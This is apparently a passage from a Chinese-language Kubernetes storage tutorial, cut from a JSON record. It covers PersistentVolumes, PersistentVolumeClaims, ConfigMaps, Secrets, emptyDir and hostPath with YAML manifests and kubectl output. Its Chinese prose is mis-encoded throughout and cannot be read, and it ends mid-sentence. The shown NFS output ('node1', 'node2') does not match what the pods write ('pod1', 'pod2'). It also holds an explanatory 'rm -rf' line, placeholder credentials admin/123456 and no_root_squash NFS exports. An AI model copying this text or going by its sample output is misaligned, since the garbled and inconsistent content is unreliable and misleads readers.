³ï¼å¹¶éè¿æä»¶å®æä¸å±äº«å­å¨çå¯¹æ¥ã\n\nPVCï¼Persistent Volume Claimï¼æ¯æä¹å·å£°æçææï¼æ¯ç¨æ·å¯¹äºå­å¨éæ±çä¸ç§å£°æãæ¢å¥è¯è¯´ï¼PVC å¶å®å°±æ¯ç¨æ·å kubernetes ç³»ç»ååºçä¸ç§èµæºéæ±ç³è¯·ã\n\n\n\nä½¿ç¨äº PV å PVC ä¹åï¼å·¥ä½å¯ä»¥å¾å°è¿ä¸æ­¥çç»åï¼\n\n * å­å¨ï¼å­å¨å·¥ç¨å¸ç»´æ¤\n * PVï¼ kubernetes ç®¡çåç»´æ¤\n * PVCï¼kubernetes ç¨æ·ç»´æ¤\n\n\n# PV\n\nPV æ¯å­å¨èµæºçæ½è±¡ï¼ä¸é¢æ¯èµæºæ¸åæä»¶:\n\napiVersion: v1  \nkind: PersistentVolume\nmetadata:\n  name: pv2\nspec:\n  nfs: # å­å¨ç±»åï¼ä¸åºå±çæ­£å­å¨å¯¹åº\n  capacity:  # å­å¨è½åï¼ç®ååªæ¯æå­å¨ç©ºé´çè®¾ç½®\n    storage: 2Gi\n  accessModes:  # è®¿é®æ¨¡å¼\n  storageClassName: # å­å¨ç±»å«\n  persistentVolumeReclaimPolicy: # åæ¶ç­ç¥\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nPV çå³é®éç½®åæ°è¯´æï¼\n\n * å­å¨ç±»å\n   åºå±å®éå­å¨çç±»åï¼kubernetes æ¯æå¤ç§å­å¨ç±»åï¼æ¯ç§å­å¨ç±»åçéç½®é½ææå·®å¼\n * å­å¨è½åï¼capacityï¼\n   ç®ååªæ¯æå­å¨ç©ºé´çè®¾ç½® (storage=1Gi)ï¼ä¸è¿æªæ¥å¯è½ä¼å å¥ IOPSãååéç­ææ çéç½®\n * è®¿é®æ¨¡å¼ï¼accessModesï¼\n   ç¨äºæè¿°ç¨æ·åºç¨å¯¹å­å¨èµæºçè®¿é®æéï¼è®¿é®æéåæ¬ä¸é¢å ç§æ¹å¼ï¼\n   * ReadWriteOnceï¼RWOï¼ï¼è¯»åæéï¼ä½æ¯åªè½è¢«åä¸ªèç¹æè½½ (æçæ¯ PV ä¸ PVC ç»å®åªè½ä¸ä¸ª)\n   * ReadOnlyManyï¼ROXï¼ï¼ åªè¯»æéï¼å¯ä»¥è¢«å¤ä¸ªèç¹æè½½\n   * ReadWriteManyï¼RWXï¼ï¼è¯»åæéï¼å¯ä»¥è¢«å¤ä¸ªèç¹æè½½\n     éè¦æ³¨æçæ¯ï¼åºå±ä¸åçå­å¨ç±»åå¯è½æ¯æçè®¿é®æ¨¡å¼ä¸å\n * åæ¶ç­ç¥ï¼persistentVolumeReclaimPolicyï¼\n   å½ PV ä¸åè¢«ä½¿ç¨äºä¹åï¼å¯¹å¶çå¤çæ¹å¼ãç®åæ¯æä¸ç§ç­ç¥ï¼\n   * Retain ï¼ä¿çï¼ ä¿çæ°æ®ï¼éè¦ç®¡çåæå·¥æ¸çæ°æ®\n   * Recycleï¼åæ¶ï¼ æ¸é¤ PV ä¸­çæ°æ®ï¼ææç¸å½äºæ§è¡ rm -rf /thevolume/*\n   * Delete ï¼å é¤ï¼ ä¸ PV ç¸è¿çåç«¯å­å¨å®æ volume çå é¤æä½ï¼å½ç¶è¿å¸¸è§äºäºæå¡åçå­å¨æå¡\n     éè¦æ³¨æçæ¯ï¼åºå±ä¸åçå­å¨ç±»åå¯è½æ¯æçåæ¶ç­ç¥ä¸å\n * å­å¨ç±»å«\n   PV å¯ä»¥éè¿ storageClassName åæ°æå®ä¸ä¸ªå­å¨ç±»å«\n   * å·æç¹å®ç±»å«ç PV åªè½ä¸è¯·æ±äºè¯¥ç±»å«ç PVC è¿è¡ç»å®\n   * æªè®¾å®ç±»å«ç PV ååªè½ä¸ä¸è¯·æ±ä»»ä½ç±»å«ç PVC è¿è¡ç»å®\n * ç¶æï¼statusï¼\n   ä¸ä¸ª PV ççå½å¨æä¸­ï¼å¯è½ä¼å¤äº 4 ä¸­ä¸åçé¶æ®µï¼\n   * Availableï¼å¯ç¨ï¼ï¼ è¡¨ç¤ºå¯ç¨ç¶æï¼è¿æªè¢«ä»»ä½ PVC ç»å®\n   * Boundï¼å·²ç»å®ï¼ï¼ è¡¨ç¤º PV å·²ç»è¢« PVC ç»å®\n   * Releasedï¼å·²éæ¾ï¼ï¼ è¡¨ç¤º PVC è¢«å é¤ï¼ä½æ¯èµæºè¿æªè¢«éç¾¤éæ°å£°æ\n   * Failedï¼å¤±è´¥ï¼ï¼ è¡¨ç¤ºè¯¥ PV çèªå¨åæ¶å¤±è´¥\n\nå®éª\nä½¿ç¨ NFS ä½ä¸ºå­å¨ï¼æ¥æ¼ç¤º PV çä½¿ç¨ï¼åå»º 3 ä¸ª PVï¼å¯¹åº NFS ä¸­ç 3 ä¸ªæ´é²çè·¯å¾ã\n1. åå¤ NFS ç¯å¢\n\n# åå»ºç®å½\n[root@nfs ~]# mkdir /root/data/{pv1,pv2,pv3} -pv\n\n# æ´é²æå¡\n[root@nfs ~]# more /etc/exports\n/root/data/pv1     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv2     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv3     192.168.5.0/24(rw,no_root_squash)\n\n# éå¯æå¡\n[root@nfs ~]#  systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n2. åå»º pv.yaml\n\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name:  pv1\nspec:\n  capacity: \n    storage: 1Gi\n  accessModes:\n  - ReadWriteMany\n  persistentVolumeReclaimPolicy: Retain\n  nfs:\n    path: /root/data/pv1\n    server: 192.168.5.6\n\n---\n\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name:  pv2\nspec:\n  capacity: \n    storage: 2Gi\n  accessModes:\n  - ReadWriteMany\n  persistentVolumeReclaimPolicy: Retain\n  nfs:\n    path: /root/data/pv2\n    server: 192.168.5.6\n    \n---\n\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name:  pv3\nspec:\n  capacity: \n    storage: 3Gi\n  accessModes:\n  - ReadWriteMany\n  persistentVolumeReclaimPolicy: Retain\n  nfs:\n    path: /root/data/pv3\n    server: 192.168.5.6\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n# åå»º pv\n[root@k8s-master01 ~]# kubectl create -f pv.yaml\npersistentvolume/pv1 created\npersistentvolume/pv2 created\npersistentvolume/pv3 created\n\n# æ¥çpv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nNAME   CAPACITY   ACCESS MODES  RECLAIM POLICY  STATUS      AGE   VOLUMEMODE\npv1    1Gi        RWX            Retain        Available    10s   Filesystem\npv2    2Gi        RWX            Retain        Available    10s   Filesystem\npv3    3Gi        RWX            Retain        Available    9s    Filesystem\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# PVC\n\nPVC æ¯èµæºçç³è¯·ï¼ç¨æ¥å£°æå¯¹å­å¨ç©ºé´ãè®¿é®æ¨¡å¼ãå­å¨ç±»å«éæ±ä¿¡æ¯ãä¸é¢æ¯èµæºæ¸åæä»¶:\n\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc\n  namespace: dev\nspec:\n  accessModes: # è®¿é®æ¨¡å¼\n  selector: # éç¨æ ç­¾å¯¹PVéæ©\n  storageClassName: # å­å¨ç±»å«\n  resources: # è¯·æ±ç©ºé´\n    requests:\n      storage: 5Gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nPVC çå³é®éç½®åæ°è¯´æï¼\n\n * è®¿é®æ¨¡å¼ï¼accessModesï¼\n   ç¨äºæè¿°ç¨æ·åºç¨å¯¹å­å¨èµæºçè®¿é®æé\n * éæ©æ¡ä»¶ï¼selectorï¼\n   éè¿ Label Selector çè®¾ç½®ï¼å¯ä½¿ PVC å¯¹äºç³»ç»ä¸­å·±å­å¨ç PV è¿è¡ç­é\n * å­å¨ç±»å«ï¼storageClassNameï¼\n   PVC å¨å®ä¹æ¶å¯ä»¥è®¾å®éè¦çåç«¯å­å¨çç±»å«ï¼åªæè®¾ç½®äºè¯¥ class ç pv æè½è¢«ç³»ç»éåº\n * èµæºè¯·æ±ï¼Resources ï¼\n   æè¿°å¯¹å­å¨èµæºçè¯·æ±\n\nå®éª\n1. åå»º pvc.yamlï¼ç³è¯· pv\n\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc1\n  namespace: dev\nspec:\n  accessModes: \n  - ReadWriteMany\n  resources:\n    requests:\n      storage: 1Gi\n---\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc2\n  namespace: dev\nspec:\n  accessModes: \n  - ReadWriteMany\n  resources:\n    requests:\n      storage: 1Gi\n---\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc3\n  namespace: dev\nspec:\n  accessModes: \n  - ReadWriteMany\n  resources:\n    requests:\n      storage: 1Gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n# åå»ºpvc\n[root@k8s-master01 ~]# kubectl create -f pvc.yaml\npersistentvolumeclaim/pvc1 created\npersistentvolumeclaim/pvc2 created\npersistentvolumeclaim/pvc3 created\n\n# æ¥çpvc\n[root@k8s-master01 ~]# kubectl get pvc  -n dev -o wide\nNAME   STATUS   VOLUME   CAPACITY   ACCESS MODES   STORAGECLASS   AGE   VOLUMEMODE\npvc1   Bound    pv1      1Gi        RWX                           15s   Filesystem\npvc2   Bound    pv2      2Gi        RWX                           15s   Filesystem\npvc3   Bound    pv3      3Gi        RWX                           15s   Filesystem\n\n# æ¥çpv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nNAME  CAPACITY ACCESS MODES  RECLAIM POLICY  STATUS    CLAIM       AGE     VOLUMEMODE\npv1    1Gi        RWx        Retain          Bound    dev/pvc1    3h37m    Filesystem\npv2    2Gi        RWX        Retain          Bound    dev/pvc2    3h37m    Filesystem\npv3    3Gi        RWX        Retain          Bound    dev/pvc3    3h37m    Filesystem   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n2. åå»º pods.yaml, ä½¿ç¨ pv\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod1\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod1 >> /root/out.txt; sleep 10; done;"]\n    volumeMounts:\n    - name: volume\n      mountPath: /root/\n  volumes:\n    - name: volume\n      persistentVolumeClaim:\n        claimName: pvc1\n        readOnly: false\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod2\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod2 >> /root/out.txt; sleep 10; done;"]\n    volumeMounts:\n    - name: volume\n      mountPath: /root/\n  volumes:\n    - name: volume\n      persistentVolumeClaim:\n        claimName: pvc2\n        readOnly: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pods.yaml\npod/pod1 created\npod/pod2 created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME   READY   STATUS    RESTARTS   AGE   IP            NODE   \npod1   1/1     Running   0          14s   10.244.1.69   node1   \npod2   1/1     Running   0          14s   10.244.1.70   node1  \n\n# æ¥çpvc\n[root@k8s-master01 ~]# kubectl get pvc -n dev -o wide\nNAME   STATUS   VOLUME   CAPACITY   ACCESS MODES      AGE   VOLUMEMODE\npvc1   Bound    pv1      1Gi        RWX               94m   Filesystem\npvc2   Bound    pv2      2Gi        RWX               94m   Filesystem\npvc3   Bound    pv3      3Gi        RWX               94m   Filesystem\n\n# æ¥çpv\n[root@k8s-master01 ~]# kubectl get pv -n dev -o wide\nNAME   CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM       AGE     VOLUMEMODE\npv1    1Gi        RWX            Retain           Bound    dev/pvc1    5h11m   Filesystem\npv2    2Gi        RWX            Retain           Bound    dev/pvc2    5h11m   Filesystem\npv3    3Gi        RWX            Retain           Bound    dev/pvc3    5h11m   Filesystem\n\n# æ¥çnfsä¸­çæä»¶å­å¨\n[root@nfs ~]# more /root/data/pv1/out.txt\nnode1\nnode1\n[root@nfs ~]# more /root/data/pv2/out.txt\nnode2\nnode2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# çå½å¨æ\n\nPVC å PV æ¯ä¸ä¸å¯¹åºçï¼PV å PVC ä¹é´çç¸äºä½ç¨éµå¾ªä»¥ä¸çå½å¨æï¼\n\n * èµæºä¾åºï¼ç®¡çåæå¨åå»ºåºå±å­å¨å PV\n * èµæºç»å®ï¼ç¨æ·åå»º PVCï¼kubernetes è´è´£æ ¹æ® PVC çå£°æå»å¯»æ¾ PVï¼å¹¶ç»å®\n   å¨ç¨æ·å®ä¹å¥½ PVC ä¹åï¼ç³»ç»å°æ ¹æ® PVC å¯¹å­å¨èµæºçè¯·æ±å¨å·²å­å¨ç PV ä¸­éæ©ä¸ä¸ªæ»¡è¶³æ¡ä»¶ç\n   * ä¸æ¦æ¾å°ï¼å°±å°è¯¥ PV ä¸ç¨æ·å®ä¹ç PVC è¿è¡ç»å®ï¼ç¨æ·çåºç¨å°±å¯ä»¥ä½¿ç¨è¿ä¸ª PVC äº\n   * å¦ææ¾ä¸å°ï¼PVC åä¼æ éæå¤äº Pending ç¶æï¼ç´å°ç­å°ç³»ç»ç®¡çååå»ºäºä¸ä¸ªç¬¦åå¶è¦æ±ç PV\n     PVä¸æ¦ç»å®å°æä¸ªPVCä¸ï¼å°±ä¼è¢«è¿ä¸ªPVCç¬å ï¼ä¸è½åä¸å¶ä»PVCè¿è¡ç»å®äº\n * èµæºä½¿ç¨ï¼ç¨æ·å¯å¨ pod ä¸­å volume ä¸æ ·ä½¿ç¨ pvc\n   Pod ä½¿ç¨ Volume çå®ä¹ï¼å° PVC æè½½å°å®¹å¨åçæä¸ªè·¯å¾è¿è¡ä½¿ç¨ã\n * èµæºéæ¾ï¼ç¨æ·å é¤ pvc æ¥éæ¾ pv\n   å½å­å¨èµæºä½¿ç¨å®æ¯åï¼ç¨æ·å¯ä»¥å é¤ PVCï¼ä¸è¯¥ PVC ç»å®ç PV å°ä¼è¢«æ è®°ä¸º âå·²éæ¾âï¼ä½è¿ä¸è½ç«å»ä¸å¶ä» PVC è¿è¡ç»å®ãéè¿ä¹å PVC åå¥çæ°æ®å¯è½è¿è¢«çå¨å­å¨è®¾å¤ä¸ï¼åªæå¨æ¸é¤ä¹åè¯¥ PV æè½åæ¬¡ä½¿ç¨ã\n * èµæºåæ¶ï¼kubernetes æ ¹æ® pv è®¾ç½®çåæ¶ç­ç¥è¿è¡èµæºçåæ¶\n   å¯¹äº PVï¼ç®¡çåå¯ä»¥è®¾å®åæ¶ç­ç¥ï¼ç¨äºè®¾ç½®ä¸ä¹ç»å®ç PVC éæ¾èµæºä¹åå¦ä½å¤çéçæ°æ®çé®é¢ãåªæ PV çå­å¨ç©ºé´å®æåæ¶ï¼æè½ä¾æ°ç PVC ç»å®åä½¿ç¨\n\n\n\n\n# éç½®å­å¨\n\n\n# ConfigMap\n\nConfigMap æ¯ä¸ç§æ¯è¾ç¹æ®çå­å¨å·ï¼å®çä¸»è¦ä½ç¨æ¯ç¨æ¥å­å¨éç½®ä¿¡æ¯çã\n\nåå»º configmap.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: configmap\n  namespace: dev\ndata:\n  info: |\n    username:admin\n    password:123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ¥ä¸æ¥ï¼ä½¿ç¨æ­¤éç½®æä»¶åå»º configmap\n\n# åå»ºconfigmap\n[root@k8s-master01 ~]# kubectl create -f configmap.yaml\nconfigmap/configmap created\n\n# æ¥çconfigmapè¯¦æ\n[root@k8s-master01 ~]# kubectl describe cm configmap -n dev\nName:         configmap\nNamespace:    dev\nLabels:       <none>\nAnnotations:  <none>\n\nData\n====\ninfo:\n----\nusername:admin\npassword:123456\n\nEvents:  <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\næ¥ä¸æ¥åå»ºä¸ä¸ª pod-configmap.yamlï¼å°ä¸é¢åå»ºç configmap æè½½è¿å»\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-configmap\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumeMounts: # å°configmapæè½½å°ç®å½\n    - name: config\n      mountPath: /configmap/config\n  volumes: # å¼ç¨configmap\n  - name: config\n    configMap:\n      name: configmap\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-configmap.yaml\npod/pod-configmap created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pod pod-configmap -n dev\nNAME            READY   STATUS    RESTARTS   AGE\npod-configmap   1/1     Running   0          6s\n\n#è¿å¥å®¹å¨\n[root@k8s-master01 ~]# kubectl exec -it pod-configmap -n dev /bin/sh\n# cd /configmap/config/\n# ls\ninfo\n# more info\nusername:admin\npassword:123456\n\n# å¯ä»¥çå°æ å°å·²ç»æåï¼æ¯ä¸ªconfigmapé½æ å°æäºä¸ä¸ªç®å½\n# key---\x3eæä»¶     value----\x3eæä»¶ä¸­çåå®¹\n# æ­¤æ¶å¦ææ´æ°configmapçåå®¹, å®¹å¨ä¸­çå¼ä¹ä¼å¨ææ´æ°\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# Secret\n\nå¨ kubernetes ä¸­ï¼è¿å­å¨ä¸ç§å ConfigMap éå¸¸ç±»ä¼¼çå¯¹è±¡ï¼ç§°ä¸º Secret å¯¹è±¡ãå®ä¸»è¦ç¨äºå­å¨ææä¿¡æ¯ï¼ä¾å¦å¯ç ãç§é¥ãè¯ä¹¦ç­ç­ã\n\n1. é¦åä½¿ç¨ base64 å¯¹æ°æ®è¿è¡ç¼ç \n\n[root@k8s-master01 ~]# echo -n \'admin\' | base64 #åå¤username\nYWRtaW4=\n[root@k8s-master01 ~]# echo -n \'123456\' | base64 #åå¤password\nMTIzNDU2\n\n\n1\n2\n3\n4\n\n\n2. æ¥ä¸æ¥ç¼å secret.yamlï¼å¹¶åå»º Secret\n\napiVersion: v1\nkind: Secret\nmetadata:\n  name: secret\n  namespace: dev\ntype: Opaque\ndata:\n  username: YWRtaW4=\n  password: MTIzNDU2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# åå»ºsecret\n[root@k8s-master01 ~]# kubectl create -f secret.yaml\nsecret/secret created\n\n# æ¥çsecretè¯¦æ\n[root@k8s-master01 ~]# kubectl describe secret secret -n dev\nName:         secret\nNamespace:    dev\nLabels:       <none>\nAnnotations:  <none>\nType:  Opaque\nData\n====\npassword:  6 bytes\nusername:  5 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n3. åå»º pod-secret.yamlï¼å°ä¸é¢åå»ºç secret æè½½è¿å»ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-secret\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumeMounts: # å°secretæè½½å°ç®å½\n    - name: config\n      mountPath: /secret/config\n  volumes:\n  - name: config\n    secret:\n      secretName: secret\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-secret.yaml\npod/pod-secret created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pod pod-secret -n dev\nNAME            READY   STATUS    RESTARTS   AGE\npod-secret      1/1     Running   0          2m28s\n\n# è¿å¥å®¹å¨ï¼æ¥çsecretä¿¡æ¯ï¼åç°å·²ç»èªå¨è§£ç äº\n[root@k8s-master01 ~]# kubectl exec -it pod-secret /bin/sh -n dev\n/ # ls /secret/config/\npassword  username\n/ # more /secret/config/username\nadmin\n/ # more /secret/config/password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nè³æ­¤ï¼å·²ç»å®ç°äºå©ç¨ secret å®ç°äºä¿¡æ¯çç¼ç ã',normalizedContent:'å¨åé¢å·²ç»æå°ï¼å®¹å¨ççå½å¨æå¯è½å¾ç­ï¼ä¼è¢«é¢ç¹å°åå»ºåéæ¯ãé£ä¹å®¹å¨å¨éæ¯æ¶ï¼ä¿å­å¨å®¹å¨ä¸­çæ°æ®ä¹ä¼è¢«æ¸é¤ãè¿ç§ç»æå¯¹ç¨æ·æ¥è¯´ï¼å¨æäºæåµä¸æ¯ä¸ä¹æçå°çãä¸ºäºæä¹åä¿å­å®¹å¨çæ°æ®ï¼kubernetes å¼å¥äº volume çæ¦å¿µã\n\nvolume æ¯ pod ä¸­è½å¤è¢«å¤ä¸ªå®¹å¨è®¿é®çå±äº«ç®å½ï¼å®è¢«å®ä¹å¨ pod ä¸ï¼ç¶åè¢«ä¸ä¸ª pod éçå¤ä¸ªå®¹å¨æè½½å°å·ä½çæä»¶ç®å½ä¸ï¼kubernetes éè¿ volume å®ç°åä¸ä¸ª pod ä¸­ä¸åå®¹å¨ä¹é´çæ°æ®å±äº«ä»¥åæ°æ®çæä¹åå­å¨ãvolume ççå½å®¹å¨ä¸ä¸ pod ä¸­åä¸ªå®¹å¨ççå½å¨æç¸å³ï¼å½å®¹å¨ç»æ­¢æèéå¯æ¶ï¼volume ä¸­çæ°æ®ä¹ä¸ä¼ä¸¢å¤±ã\n\nkubernetes ç volume æ¯æå¤ç§ç±»åï¼æ¯è¾å¸¸è§çæä¸é¢å ä¸ªï¼\n\n * ç®åå­å¨ï¼emptydirãhostpathãnfs\n * é«çº§å­å¨ï¼pvãpvc\n * éç½®å­å¨ï¼configmapãsecret\n\n\n# åºæ¬å­å¨\n\n\n# emptydir\n\nemptydir æ¯æåºç¡ç volume ç±»åï¼ä¸ä¸ª emptydir å°±æ¯ host ä¸çä¸ä¸ªç©ºç®å½ã\n\nemptydir æ¯å¨ pod è¢«åéå° node æ¶åå»ºçï¼å®çåå§åå®¹ä¸ºç©ºï¼å¹¶ä¸æ é¡»æå®å®¿ä¸»æºä¸å¯¹åºçç®å½æä»¶ï¼å ä¸º kubernetes ä¼èªå¨åéä¸ä¸ªç®å½ï¼å½ pod éæ¯æ¶ï¼ emptydir ä¸­çæ°æ®ä¹ä¼è¢«æ°¸ä¹å é¤ã emptydir ç¨éå¦ä¸ï¼\n\n * ä¸´æ¶ç©ºé´ï¼ä¾å¦ç¨äºæäºåºç¨ç¨åºè¿è¡æ¶æéçä¸´æ¶ç®å½ï¼ä¸æ é¡»æ°¸ä¹ä¿ç\n * ä¸ä¸ªå®¹å¨éè¦ä»å¦ä¸ä¸ªå®¹å¨ä¸­è·åæ°æ®çç®å½ï¼å¤å®¹å¨å±äº«ç®å½ï¼\n\næ¥ä¸æ¥ï¼éè¿ä¸ä¸ªå®¹å¨ä¹é´æä»¶å±äº«çæ¡ä¾æ¥ä½¿ç¨ä¸ä¸ emptydirã\n\nå¨ä¸ä¸ª pod ä¸­åå¤ä¸¤ä¸ªå®¹å¨ nginx å busyboxï¼ç¶åå£°æä¸ä¸ª volume åå«æå¨å°ä¸¤ä¸ªå®¹å¨çç®å½ä¸­ï¼ç¶å nginx å®¹å¨è´è´£å volume ä¸­åæ¥å¿ï¼busybox ä¸­éè¿å½ä»¤å°æ¥å¿åå®¹è¯»å°æ§å¶å°ã\n\n\n\nåå»ºä¸ä¸ª volume-emptydir.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: volume-emptydir\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerport: 80\n    volumemounts:  # å°logs-volumeæå¨å°nginxå®¹å¨ä¸­ï¼å¯¹åºçç®å½ä¸º /var/log/nginx\n    - name: logs-volume\n      mountpath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] # åå§å½ä»¤ï¼å¨æè¯»åæå®æä»¶ä¸­åå®¹\n    volumemounts:  # å°logs-volume æå¨å°busyboxå®¹å¨ä¸­ï¼å¯¹åºçç®å½ä¸º /logs\n    - name: logs-volume\n      mountpath: /logs\n  volumes: # å£°ævolumeï¼ nameä¸ºlogs-volumeï¼ç±»åä¸ºemptydir\n  - name: logs-volume\n    emptydir: {}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f volume-emptydir.yaml\npod/volume-emptydir created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods volume-emptydir -n dev -o wide\nname                  ready   status    restarts   age      ip       node   ...... \nvolume-emptydir       2/2     running   0          97s   10.42.2.9   node1  ......\n\n# éè¿podipè®¿é®nginx\n[root@k8s-master01 ~]# curl 10.42.2.9\n......\n\n# éè¿kubectl logså½ä»¤æ¥çæå®å®¹å¨çæ åè¾åº\n[root@k8s-master01 ~]# kubectl logs -f volume-emptydir -n dev -c busybox\n10.42.1.0 - - [27/jun/2021:15:08:54 +0000] "get / http/1.1" 200 612 "-" "curl/7.29.0" "-"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# hostpath\n\nemptydir ä¸­æ°æ®ä¸ä¼è¢«æä¹åï¼å®ä¼éç pod çç»æèéæ¯ï¼å¦ææ³ç®åçå°æ°æ®æä¹åå°ä¸»æºä¸­ï¼å¯ä»¥éæ© hostpathã\n\nhostpath å°±æ¯å° node ä¸»æºä¸­ä¸ä¸ªå®éç®å½æå¨å° pod ä¸­ï¼ä»¥ä¾å®¹å¨ä½¿ç¨ï¼è¿æ ·çè®¾è®¡å°±å¯ä»¥ä¿è¯ pod éæ¯äºï¼ä½æ¯æ°æ®ä¾æ®å¯ä»¥å­å¨äº node ä¸»æºä¸ã\n\n\n\nåå»ºä¸ä¸ª volume-hostpath.yamlï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: volume-hostpath\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerport: 80\n    volumemounts:\n    - name: logs-volume\n      mountpath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"]\n    volumemounts:\n    - name: logs-volume\n      mountpath: /logs\n  volumes:\n  - name: logs-volume\n    hostpath: \n      path: /root/logs #å®¿ä¸»æºç®å½\n      type: directoryorcreate  # ç®å½å­å¨å°±ä½¿ç¨ï¼ä¸å­å¨å°±ååå»ºåä½¿ç¨\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n> å³äº type çå¼çä¸ç¹è¯´æï¼\n> directoryorcreate ç®å½å­å¨å°±ä½¿ç¨ï¼ä¸å­å¨å°±ååå»ºåä½¿ç¨\n> directory ç®å½å¿é¡»å­å¨\n> fileorcreate æä»¶å­å¨å°±ä½¿ç¨ï¼ä¸å­å¨å°±ååå»ºåä½¿ç¨\n> file æä»¶å¿é¡»å­å¨\n> socket unix å¥æ¥å­å¿é¡»å­å¨\n> chardevice å­ç¬¦è®¾å¤å¿é¡»å­å¨\n> blockdevice åè®¾å¤å¿é¡»å­å¨\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f volume-hostpath.yaml\npod/volume-hostpath created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods volume-hostpath -n dev -o wide\nname                  ready   status    restarts   age   ip             node   ......\npod-volume-hostpath   2/2     running   0          16s   10.42.2.10     node1  ......\n\n#è®¿é®nginx\n[root@k8s-master01 ~]# curl 10.42.2.10\n\n# æ¥ä¸æ¥å°±å¯ä»¥å»hostç/root/logsç®å½ä¸æ¥çå­å¨çæä»¶äº\n###  æ³¨æ: ä¸é¢çæä½éè¦å°podæå¨çèç¹è¿è¡ï¼æ¡ä¾ä¸­æ¯node1ï¼\n[root@node1 ~]# ls /root/logs/\naccess.log  error.log\n\n# åæ 